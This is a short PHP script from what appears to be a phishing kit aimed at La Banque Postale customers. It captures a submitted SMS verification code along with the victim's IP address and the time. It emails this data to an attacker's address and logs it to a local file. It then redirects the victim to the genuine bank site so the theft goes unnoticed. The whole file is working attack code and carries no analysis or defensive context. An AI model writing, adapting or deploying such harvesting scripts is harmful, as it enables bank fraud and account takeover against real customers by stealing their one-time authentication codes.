<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "~~~~~~~~~~~~~~~~~ SMS ~~~~~~~~~~~~~~\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "sms              :     ".$_POST[chp1]."\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "IP                    :     $ip\n\r";
$message .= "DATE                  :     $date\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r\n\r";

$send = "jaaykrimo@gmail@com";
$subject = "SMS 2 $ip ";
$from .= "From: ACHRAF ";
$from .= 'MIME-Version: 1.0' . "\r\n";


@mail($send,$subject,$message,$from);

$fp = fopen('sms.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<SCRIPT LANGUAGE="JavaScript">
document.location.href="https://labanquepostale.fr/"
</SCRIPT>
 